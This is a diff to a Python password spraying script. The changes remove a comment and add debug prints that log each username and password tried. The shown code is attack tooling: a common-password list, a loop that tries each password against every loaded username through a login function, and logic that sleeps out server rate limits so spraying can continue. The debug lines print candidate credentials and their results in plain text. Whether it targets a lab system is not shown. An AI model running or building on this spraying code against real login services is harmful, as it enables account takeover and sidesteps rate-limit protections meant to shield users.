@@ -26,7 +26,6 @@ DEFAULT_ATTEMPTS = 50000
 TOTP_TIME_STEP = 30
 TOTP_DIGITS = 6
 
-# Common passwords
 COMMON_PASSWORDS = [
     "123456", "password", "12345678", "qwerty", "123456789",
     "12345", "1234", "111111", "1234567", "dragon",
@@ -255,6 +254,7 @@ def password_spraying_attack(usernames=None, passwords=None, max_attempts=DEFAUL
     """
     if usernames is None:
         usernames = load_usernames()
+        print(f"DEBUG: Found {len(usernames)} users. Starting attack...")
     
     if passwords is None:
         passwords = COMMON_PASSWORDS
@@ -268,6 +268,8 @@ def password_spraying_attack(usernames=None, passwords=None, max_attempts=DEFAUL
             
             limiter.record_attempt()
             success, response = full_login_attempt(username, password)
+
+            print(f"[*] Spraying {username} with pass '{password}' -> Result: {success}")
             
             if "Rate limit" in str(response.get("message", "")):
                 time.sleep(response.get("retry_after", 60))
